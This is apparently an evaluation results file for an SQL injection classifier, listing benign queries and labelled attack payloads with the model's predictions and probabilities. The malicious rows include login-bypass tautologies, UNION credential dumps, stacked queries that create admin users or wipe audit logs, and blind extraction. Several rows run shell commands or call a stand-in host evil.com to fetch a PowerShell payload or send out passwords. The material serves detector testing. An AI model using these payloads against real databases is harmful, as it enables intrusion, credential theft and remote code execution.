query,label,category,description,predicted,correct,malicious_probability
"SELECT u.*, p.* FROM users u INNER JOIN profiles p ON u.id = p.user_id;",0,join,Inner join,1,False,0.8969355719583537
"SELECT o.*, u.email FROM orders o RIGHT JOIN users u ON o.user_id = u.id;",0,join,Right join,1,False,0.6314513686014706
"SELECT p.name, c.name AS category FROM products p JOIN categories c ON p.category_id = c.id;",0,join,Named join,0,True,0.15256620507373211
SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id;,0,join,Triple join,1,False,0.7045026121192239
"SELECT u.name, COUNT(o.id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name;",0,group_by,Customer summary,1,False,0.8849772091484485
"SELECT DATE(created_at) as date, COUNT(*) as orders FROM orders GROUP BY DATE(created_at);",0,group_by,Daily orders,0,True,0.07839890709338869
"SELECT category_id, COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category_id HAVING COUNT(*) > 10;",0,group_by,Category stats,0,True,0.13293400074108258
"SELECT YEAR(created_at), MONTH(created_at), SUM(total) FROM orders GROUP BY YEAR(created_at), MONTH(created_at);",0,group_by,Monthly revenue,0,True,0.28554803377509497
SELECT * FROM products WHERE description LIKE '%wireless%';,0,like,Description search,0,True,0.019491847118303155
SELECT * FROM users WHERE email LIKE '%@company.com';,0,like,Company emails,0,True,0.23723643864612418
SELECT * FROM products WHERE name LIKE 'Samsung%' OR name LIKE 'Apple%';,0,like,Brand search,1,False,0.9698963190865565
SELECT * FROM logs WHERE message LIKE '%error%' OR message LIKE '%warning%';,0,like,Log search,1,False,0.9255195648225593
"INSERT INTO products (name, price, stock) VALUES ('New Product', 29.99, 100);",0,insert,Product insert,0,True,0.17920527596971506
"INSERT INTO users (email, password_hash, created_at) VALUES ('new@example.com', 'hash123', NOW());",0,insert,User registration,1,False,0.9828317042174511
"INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (100, 50, 2, 19.99);",0,insert,Order item,0,True,0.0073602539581255596
"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",0,insert,Log entry,0,True,0.4146238968211603
UPDATE products SET stock = stock - 1 WHERE id = 42;,0,update,Decrement stock,0,True,0.4842214483504424
UPDATE users SET last_login = NOW() WHERE id = 5;,0,update,Login timestamp,0,True,0.30239360187657316
"UPDATE orders SET status = 'processing', updated_at = NOW() WHERE id = 100;",0,update,Order status,0,True,0.0028631709729651242
UPDATE products SET price = price * 0.9 WHERE category_id = 5;,0,update,Category discount,0,True,0.00024123728390083122
"DELETE FROM sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);",0,delete,Old sessions,1,False,0.7524286947617027
DELETE FROM cart_items WHERE user_id = 42 AND product_id = 100;,0,delete,Remove from cart,0,True,0.03718164589757919
"DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < DATE_SUB(NOW(), INTERVAL 90 DAY);",0,delete,Old notifications,1,False,0.9712065731111925
SELECT CURRENT_TIMESTAMP;,0,minimal,Current timestamp,0,True,0.30105237261968426
SELECT CURDATE();,0,minimal,Current date,0,True,0.3343575934355721
SELECT USER();,0,minimal,Current user,1,False,0.8346437192241422
SELECT @@sql_mode;,0,minimal,SQL mode,0,True,0.40430103618637014
SELECT CONNECTION_ID();,0,minimal,Connection ID,1,False,0.9929232321367044
SELECT LAST_INSERT_ID();,0,minimal,Last insert ID,1,False,0.91863735572576
SELECT UUID();,0,minimal,Generate UUID,1,False,0.7094796494761132
SELECT * FROM products WHERE name = 'TRUNCATE Your Collection';,0,edge_case,Product name contains TRUNCATE,0,True,0.31354954521437106
SELECT * FROM products WHERE name = 'DELETE Me Not Flowers';,0,edge_case,Product name contains DELETE,0,True,0.07198404626470699
SELECT * FROM products WHERE name = 'INSERT Coin Arcade';,0,edge_case,Product name contains INSERT,0,True,0.07870926742884365
SELECT * FROM products WHERE name = 'UPDATE Your Wardrobe';,0,edge_case,Product name contains UPDATE,0,True,0.015990894591446047
SELECT * FROM products WHERE name = 'ALTER Ego Perfume';,0,edge_case,Product name contains ALTER,0,True,0.2828695594124893
SELECT * FROM products WHERE name = 'EXEC-utive Chair';,0,edge_case,Product name contains EXEC,0,True,0.04765149655335915
SELECT * FROM products WHERE name = '1=1 Equals One T-Shirt';,0,edge_case,Product contains 1=1,1,False,0.9704615307710404
SELECT * FROM products WHERE name = 'NULL and Void Game';,0,edge_case,Product contains NULL,0,True,0.41017878283636927
SELECT * FROM products WHERE sku = 'DROP-SHIP-001';,0,edge_case,SKU contains DROP,1,False,0.5416537240841166
SELECT * FROM products WHERE sku = 'SLEEP-WELL-002';,0,edge_case,SKU contains SLEEP,1,False,0.7852197109146155
SELECT * FROM users WHERE username = 'admin123';,0,edge_case,Valid admin username,1,False,0.9999290641203264
SELECT * FROM users WHERE username = 'test_user';,0,edge_case,Test username,0,True,0.2973856516933291
SELECT * FROM products WHERE description = 'Best seller -- highly recommended!';,0,edge_case,Double dash in description,1,False,0.9399680522180481
SELECT * FROM reviews WHERE comment = 'Works great; love it!';,0,edge_case,Semicolon in comment,1,False,0.9935849711185248
"SELECT * FROM products WHERE notes = 'Available in sizes S, M, L -- order now!';",0,edge_case,Double dash in notes,1,False,0.8340690528546775
SELECT * FROM users WHERE bio = 'Developer @ Tech Corp; Python enthusiast';,0,edge_case,Special chars in bio,1,False,0.6313500829379831
SELECT * FROM products WHERE tags LIKE '%or%';,0,edge_case,Tags with or,0,True,0.03652335965495245
SELECT * FROM products WHERE keywords LIKE '%and%';,0,edge_case,Keywords with and,0,True,0.12831600747728014
SELECT * FROM users WHERE password_hint = 'My pet''s name + birth year';,0,edge_case,Escaped quote in hint,1,False,0.7630008073546231
SELECT * FROM contacts WHERE company = 'O''Reilly Media';,0,edge_case,Company with apostrophe,0,True,0.21258073439264524
SELECT * FROM users WHERE name = 'D''Angelo';,0,edge_case,Name with apostrophe,0,True,0.06715403283442041
SELECT * FROM addresses WHERE street = '123 O''Connor Street';,0,edge_case,Street with apostrophe,1,False,0.5391055445714144
SELECT * FROM products WHERE id > 0 AND price > 0;,0,edge_case,Double positive conditions,0,True,0.009071397249284184
SELECT * FROM users WHERE id = id;,0,edge_case,Self equality,0,True,0.003619251223118106
"SELECT id, id FROM users LIMIT 5;",0,edge_case,Duplicate column,0,True,3.066658343257427e-06
"SELECT 1+1, 2+2, 3+3;",0,edge_case,Math expressions,0,True,0.3670425782216523
"SELECT 'hello', 'world';",0,edge_case,String literals,1,False,0.9508625403670646
SELECT NULL IS NULL;,0,edge_case,Null check expression,1,False,0.9998881458583047
"SELECT TRUE, FALSE;",0,edge_case,Boolean literals,0,True,0.38357337320717616
SELECT * FROM (SELECT * FROM users WHERE id < 10) AS subq;,0,subquery,Derived table,0,True,0.30677469955688497
SELECT * FROM users WHERE salary > (SELECT AVG(salary) FROM users);,0,subquery,Comparison subquery,0,True,0.22515809836776696
SELECT * FROM products WHERE EXISTS (SELECT 1 FROM inventory WHERE inventory.product_id = products.id AND quantity > 0);,0,subquery,EXISTS subquery,0,True,0.278808418583864
"SELECT (SELECT name FROM categories WHERE id = p.category_id) as cat_name, p.name FROM products p;",0,subquery,Scalar subquery,0,True,0.0021648397290754125
SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users);,0,subquery,Max ID subquery,0,True,0.4092054199152754
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE vip = 1);,0,subquery,VIP customers,0,True,0.006663505522716153
1' OR '1'='1' --,1,tautology,Space before comment,1,True,1.0
' OR '1'='1' /*,1,tautology,Block comment end,1,True,1.0
') OR ('x'='x,1,tautology,Parenthesis string,1,True,0.999999999982371
0' OR '0'='0,1,tautology,Zero tautology,1,True,0.999999999999968
' OR 2>1--,1,tautology,Greater than tautology,1,True,1.0
' OR 1<2--,1,tautology,Less than tautology,1,True,1.0
' OR 1!=2--,1,tautology,Not equal tautology,1,True,0.9999999999999998
' OR NOT 1=2--,1,tautology,NOT tautology,1,True,0.9999999999767006
' OR true--,1,tautology,Boolean true,1,True,0.9999999999886879
' OR 1--,1,tautology,Simple true,1,True,1.0
admin' OR '1'='1,1,tautology,Admin bypass,1,True,1.0
administrator'--,1,tautology,Administrator bypass,1,True,0.9999999999997748
root'--,1,tautology,Root bypass,1,True,0.9999999519199306
' OR ''=',1,tautology,Empty equality,1,True,1.0
' OR 'abc'='abc,1,tautology,String equality,1,True,0.9999999999998772
"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,union,Ten column UNION,1,True,0.9999999999378615
"' UNION SELECT null,null,null,null,null,null,null,null--",1,union,Eight nulls,1,True,0.9999999784755436
"' UNION SELECT id,username,password,email,null,null FROM users--",1,union,User data extraction,1,True,0.999999983785878
' UNION SELECT * FROM mysql.user--,1,union,MySQL users,1,True,0.999999979476828
' UNION SELECT * FROM pg_shadow--,1,union,PostgreSQL passwords,1,True,0.9999999833720505
' UNION SELECT * FROM all_users--,1,union,Oracle users,1,True,0.9999999998620923
' UNION SELECT * FROM sys.syslogins--,1,union,MSSQL logins,1,True,0.9999998720394622
"' UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--",1,union,Column enumeration,1,True,0.9999937052812417
"' UNION SELECT schema_name,null,null,null FROM information_schema.schemata--",1,union,Schema enumeration,1,True,0.9999922154062093
"' UNION SELECT grantee,privilege_type,null,null FROM information_schema.user_privileges--",1,union,Privilege enumeration,1,True,0.9999694224765462
"' UNION SELECT host,user,password FROM mysql.user--",1,union,MySQL credentials,1,True,0.9999998651120705
"' UNION SELECT name,sql,null,null FROM sqlite_master--",1,union,SQLite schema,1,True,0.9999985571306147
"' UNION SELECT @@hostname,@@version,user(),database()--",1,union,Server info,1,True,0.9999999992935931
"' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null--",1,union,File read UNION,1,True,0.9999999977745415
"'; INSERT INTO users (username,password,role) VALUES ('evil','password','admin')--",1,stacked,Create admin,1,True,0.9999999990262693
'; UPDATE users SET is_admin = 1 WHERE username = 'attacker'--,1,stacked,Grant admin,1,True,0.9999999402493609
'; DELETE FROM audit_log--,1,stacked,Delete audit,1,True,0.9999634575251414
'; DROP INDEX idx_users_email--,1,stacked,Drop index,1,True,0.9999998603839304
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'--,1,stacked,Grant privileges,1,True,0.9999999980816123
'; REVOKE ALL PRIVILEGES ON *.* FROM 'legit_user'@'localhost'--,1,stacked,Revoke privileges,1,True,0.9999751173313057
'; CREATE USER 'backdoor' IDENTIFIED BY 'secret'--,1,stacked,Create user,1,True,0.999999897431246
'; ALTER USER 'admin' IDENTIFIED BY 'hacked123'--,1,stacked,Change password,1,True,0.9999999999999976
'; RENAME TABLE users TO users_backup--,1,stacked,Rename table,1,True,0.9999999098135178
'; TRUNCATE audit_logs--,1,stacked,Truncate audit,1,True,0.9999997671798029
"1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--",1,stacked,MSSQL sysadmin,1,True,0.9999999999969227
"'; EXEC sp_configure 'xp_cmdshell', 1--",1,stacked,Enable cmdshell,1,True,0.9999999603049019
' AND SLEEP(15)--,1,time_blind,15 second sleep,1,True,0.9999999999489508
' AND SLEEP(30)--,1,time_blind,30 second sleep,1,True,0.9999999999732665
"' AND IF(1=1,SLEEP(10),0)--",1,time_blind,Conditional 10s,1,True,0.9999999976852585
"' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(10),0)--",1,time_blind,Version check sleep,1,True,0.999999998991892
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--,1,time_blind,User check sleep,1,True,0.999999999999921
"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",1,time_blind,Table exists sleep,1,True,0.9999999506384456
"' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",1,time_blind,Password extraction,1,True,0.9999998531365994
"' OR IF(1=1,BENCHMARK(50000000,MD5('test')),0)--",1,time_blind,High benchmark,1,True,0.999999962213099
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--,1,time_blind,PostgreSQL CASE sleep,1,True,0.9999999206536209
"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",1,time_blind,Oracle time delay,1,True,0.9999999899700655
' AND 1=1 AND 'a'='a,1,boolean_blind,Double AND true,1,True,0.9999999999999913
' AND 1=2 AND 'a'='a,1,boolean_blind,AND false,1,True,0.999999999999732
' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--,1,boolean_blind,Length check,1,True,0.9999815436396056
"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",1,boolean_blind,First char check,1,True,0.9999999319100561
' AND (SELECT COUNT(*) FROM information_schema.tables)>10--,1,boolean_blind,Table count,1,True,0.9999767794131974
' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--,1,boolean_blind,Table name check,1,True,0.9998271653701012
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--,1,boolean_blind,Column check,1,True,0.9999440679755995
' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>5--,1,boolean_blind,Column count,1,True,0.9999754187029314
"' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",1,boolean_blind,Complex extraction,1,True,0.999992004491961
' AND (SELECT 1)=1--,1,boolean_blind,Simple subquery true,1,True,0.9999999998286759
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",1,error_based,Database name error,1,True,0.9999999588239584
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",1,error_based,User name error,1,True,0.9999998754773576
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",1,error_based,Table name error,1,True,0.9999807336101584
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1,error_based,Password error,1,True,0.9999973281366911
"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",1,error_based,Complex error,1,True,0.9999999972866638
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Group by error,1,True,0.9999983388121543
' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--,1,error_based,Geometry error,1,True,0.9999990137520883
' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--,1,error_based,Polygon error,1,True,0.9999565924063585
' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--,1,error_based,Linestring error,1,True,0.9999914662015034
' OR 1+1=2--,1,obfuscated_case,Math expression,1,True,0.9999999999999976
'oR'1'='1,1,obfuscated_case,No spaces OR,1,True,0.9999999999998161
'AnD 1=0 oR 1=1--,1,obfuscated_case,Mixed AND OR,1,True,0.999999999999988
' union select null--,1,obfuscated_case,Lowercase union,1,True,0.9983782173476274
' UNION select null--,1,obfuscated_case,Mixed case union,1,True,0.9999999953434762
' UnIoN aLl SeLeCt NuLl--,1,obfuscated_case,Alternating UNION ALL,1,True,0.9999994685280107
'/**/oR/**/1=1--,1,obfuscated_comment,Comment OR lowercase,1,True,1.0
"'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",1,obfuscated_comment,Comment UNION ALL,1,True,0.9999999999999998
'/*!00000OR*/1=1--,1,obfuscated_comment,MySQL conditional,1,True,0.999999999901731
"'/*!12345UNION*//*!12345SELECT*/1,2,3--",1,obfuscated_comment,MySQL version UNION,1,True,0.999999992829588
'/**_**/OR/**_**/1=1--,1,obfuscated_comment,Underscore comments,1,True,1.0
'+OR+'1'='1,1,obfuscated_concat,Plus concat,1,True,0.9999999999999949
'||'1'='1,1,obfuscated_concat,Oracle concat OR,1,True,0.9999999999999478
' OR CHAR(49)=CHAR(49)--,1,obfuscated_concat,CHAR comparison,1,True,0.9999992822648058
' OR 0x313d31--,1,obfuscated_encoded,Hex comparison,1,True,0.9999999999960916
' OR UNHEX('3d')=UNHEX('3d')--,1,obfuscated_encoded,UNHEX comparison,1,True,0.9999999999917868
'%20OR%20'1'='1,1,obfuscated_encoded,URL space encoding,1,True,0.9999999999780833
'%09OR%091=1--,1,obfuscated_encoded,URL tab encoding,1,True,0.9999999999984748
'%0aOR%0a1=1--,1,obfuscated_encoded,URL newline encoding,1,True,0.9999999999999365
'%00' OR '1'='1,1,obfuscated_encoded,Null byte injection,1,True,1.0
' unicode OR 1=1--,1,obfuscated_encoded,Unicode prefix,1,True,0.9999999999999998
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --',1,full_injection_select,Full login bypass,1,True,1.0
"SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users--",1,full_injection_select,Full data extraction,1,True,0.9999997186982076
"SELECT * FROM users WHERE email = 'x' UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--",1,full_injection_select,Full schema extraction,1,True,0.9999996028709056
SELECT * FROM orders WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0--,1,full_injection_select,Full boolean check,1,True,0.9998227899550599
SELECT * FROM products WHERE id = '1' AND SLEEP(5) AND '1'='1,1,full_injection_select,Full time-based,1,True,0.9999999999804186
"INSERT INTO comments (user_id, text) VALUES (1, 'test'); DELETE FROM users; --');",1,full_injection_insert,Insert with delete,1,True,0.9999997223481447
"INSERT INTO feedback (message) VALUES ('x'),(SELECT password FROM users)--');",1,full_injection_insert,Insert subquery,1,True,0.999993818386766
UPDATE users SET email = 'x@x.com' WHERE id = 1 OR 1=1--,1,full_injection_update,Update all users,1,True,0.9999999999859135
UPDATE products SET price = 0 WHERE id = 1; DROP TABLE products--,1,full_injection_update,Update drop,1,True,0.999758289209034
DELETE FROM products WHERE id = 1 OR id = id--,1,full_injection_delete,Delete all,1,True,0.9997971272048372
DELETE FROM orders WHERE 1=1; INSERT INTO users (admin) VALUES (1)--,1,full_injection_delete,Delete insert,1,True,0.9999999964206612
"' UNION SELECT name,sql FROM sqlite_master--",1,advanced,SQLite schema dump,1,True,0.9999996527927582
"' UNION SELECT group_concat(tbl_name),1 FROM sqlite_master WHERE type='table'--",1,advanced,SQLite tables,1,True,0.9999993847887912
' OR 1=1; ATTACH DATABASE '/tmp/evil.db' AS evil--,1,advanced,SQLite attach,1,True,0.9999999999994682
'; COPY (SELECT '') TO PROGRAM 'whoami'--,1,advanced,PostgreSQL command,1,True,0.9999999937455684
'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS 'system($1)' LANGUAGE plperlu--,1,advanced,PostgreSQL function shell,1,True,0.9999988306647232
'; DO $$DECLARE r RECORD;BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''id''';END$$--,1,advanced,PostgreSQL DO block,1,True,0.999999984262026
"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",1,advanced,MSSQL convert error,1,True,0.9999987246083509
'; EXEC master..xp_cmdshell 'powershell -c IEX(wget http://evil.com/shell.ps1)'--,1,advanced,MSSQL powershell,1,True,0.9999991595684641
'; EXEC master..xp_fileexist 'C:\Windows\win.ini'--,1,advanced,MSSQL file check,1,True,0.9999993143366598
"'; SELECT * FROM OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=password','SELECT 1')--",1,advanced,MSSQL OPENROWSET,1,True,0.9999979720334231
' OR UTL_HTTP.request('http://evil.com/'||(SELECT password FROM users WHERE rownum=1))--,1,advanced,Oracle out-of-band,1,True,0.9999998646873444
' AND DBMS_XMLQUERY.NEWCONTEXT('SELECT * FROM users')--,1,advanced,Oracle XML injection,1,True,0.9999887912175123
"' UNION SELECT XMLType('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/""> %xxe;]><foo></foo>') FROM dual--",1,advanced,Oracle XXE,1,True,0.999999717180245
' AND '1'='1&password=anything,1,advanced,Parameter pollution,1,True,0.9999999999995679
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(@@secure_file_priv)))--",1,advanced,Check file privs,1,True,0.9999996416121567
' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--,1,advanced,Base64 file read,1,True,0.9999999998818379
SELECT * FROM products WHERE {{user_input}};,0,placeholder,Template placeholder,0,True,0.0018769815344809521
SELECT * FROM users WHERE role = %(role)s;,0,placeholder,Python format placeholder,0,True,0.006006134433194282
SELECT * FROM orders WHERE id = {0};,0,placeholder,C# format placeholder,0,True,0.00043713398043998346
SELECT * FROM products WHERE id = @product_id;,0,placeholder,MSSQL parameter,0,True,0.0001809019445628211
SELECT * FROM users WHERE id = $1;,0,placeholder,PostgreSQL parameter,0,True,0.002810299771905272
SELECT * FROM users WHERE email = :email AND status = :status;,0,placeholder,Multiple named params,0,True,0.0035868261612252038
SELECT * FROM products WHERE price BETWEEN :min_price AND :max_price;,0,placeholder,Range params,0,True,0.001154818060970528
"SELECT * FROM users WHERE TIMESTAMPDIFF(YEAR, birthday, CURDATE()) >= 18;",0,complex_benign,Age calculation,0,True,0.0663671506738148
SELECT * FROM products WHERE (price - discount_amount) * (1 + tax_rate) < 100;,0,complex_benign,Complex expression,0,True,0.004346624330702309
"SELECT IFNULL(nickname, CONCAT(first_name, ' ', last_name)) AS display_name FROM users;",0,complex_benign,IFNULL concat,1,False,0.9438204136035152
"SELECT *, CASE WHEN stock > 10 THEN 'In Stock' WHEN stock > 0 THEN 'Low Stock' ELSE 'Out of Stock' END AS availability FROM products;",0,complex_benign,Multi-case expression,1,False,0.910500682915847
"SELECT * FROM users WHERE email RLIKE '^[a-z]+@[a-z]+\\.[a-z]{2,}$';",0,complex_benign,RLIKE pattern,0,True,0.05738084335608586
SELECT INET_ATON('192.168.1.1');,0,complex_benign,IP function,1,False,0.9838429164839774
SELECT HEX('hello');,0,complex_benign,HEX function,1,False,0.9272607529219269
SELECT MD5('password');,0,complex_benign,MD5 function,1,False,0.9950497111346984
"SELECT SHA2('data', 256);",0,complex_benign,SHA function,1,False,0.9765745767238746
"SELECT JSON_EXTRACT(data, '$.user.name') FROM orders;",0,complex_benign,JSON extract,1,False,0.6422999242040958
"SELECT * FROM users WHERE JSON_CONTAINS(permissions, '\admin\""');""",0,complex_benign,JSON contains,1,False,0.9999564777607216
WITH RECURSIVE category_tree AS (SELECT * FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.* FROM categories c JOIN category_tree ct ON c.parent_id = ct.id) SELECT * FROM category_tree;,0,complex_benign,Recursive CTE,1,False,0.9662946639941122
"SELECT *, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY price DESC) as rank FROM products;",0,complex_benign,Window function,1,False,0.8488247276177324
"SELECT *, LAG(price) OVER (ORDER BY created_at) as prev_price FROM products;",0,complex_benign,LAG function,0,True,0.043957450950441825
"SELECT *, SUM(total) OVER (ORDER BY created_at ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as running_total FROM orders;",0,complex_benign,Running total,1,False,0.8608548677256326
SELECT * FROM products WHERE SOUNDEX(name) = SOUNDEX('phone');,0,complex_benign,SOUNDEX search,0,True,0.11286547297811095
SELECT * FROM users WHERE MATCH(bio) AGAINST('developer programmer' IN NATURAL LANGUAGE MODE);,0,complex_benign,Full text natural,1,False,0.9477968381136993
SELECT * FROM products FORCE INDEX (idx_category) WHERE category_id = 5;,0,complex_benign,Force index,0,True,0.003959839813956396
SELECT /*+ INDEX(users idx_email) */ * FROM users WHERE email = 'test@example.com';,0,complex_benign,Index hint,1,False,0.9707286681219104
LOCK TABLES users WRITE;,0,complex_benign,Lock table,1,False,0.9999289273497896
START TRANSACTION;,0,complex_benign,Start transaction,1,False,0.9995452695980387
COMMIT;,0,complex_benign,Commit,1,False,0.5673426836135912
ROLLBACK;,0,complex_benign,Rollback,1,False,0.9831257121599828
SET autocommit = 0;,0,complex_benign,Disable autocommit,1,False,0.9210620917811863
SET NAMES 'utf8mb4';,0,complex_benign,Set charset,1,False,0.9763124551347471
SET @var = 5;,0,complex_benign,Set variable,0,True,0.0003649958818345611
SELECT @var;,0,complex_benign,Select variable,0,True,0.060971371989844605
PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';,0,complex_benign,Prepare statement,0,True,0.013892223597773173
EXECUTE stmt USING @user_id;,0,complex_benign,Execute prepared,1,False,0.8375921330048507
DEALLOCATE PREPARE stmt;,0,complex_benign,Deallocate prepared,1,False,0.9990400619039985
ANALYZE TABLE users;,0,complex_benign,Analyze table,1,False,0.9999978797106167
OPTIMIZE TABLE products;,0,complex_benign,Optimize table,1,False,0.9999024550282446
CHECK TABLE orders;,0,complex_benign,Check table,1,False,0.9999861207570803
REPAIR TABLE sessions;,0,complex_benign,Repair table,1,False,0.9999424224936587
FLUSH PRIVILEGES;,0,complex_benign,Flush privileges,1,False,0.99720217618771
SHOW PROCESSLIST;,0,complex_benign,Show processes,1,False,0.9963387652955108
SHOW VARIABLES LIKE 'max_connections';,0,complex_benign,Show variable,1,False,0.9882532969159039
SHOW STATUS LIKE 'Threads%';,0,complex_benign,Show status,1,False,0.9959324797733274
SHOW INDEX FROM users;,0,complex_benign,Show indexes,1,False,0.8876289759416768
SHOW GRANTS FOR CURRENT_USER;,0,complex_benign,Show grants,1,False,0.9997635426126974
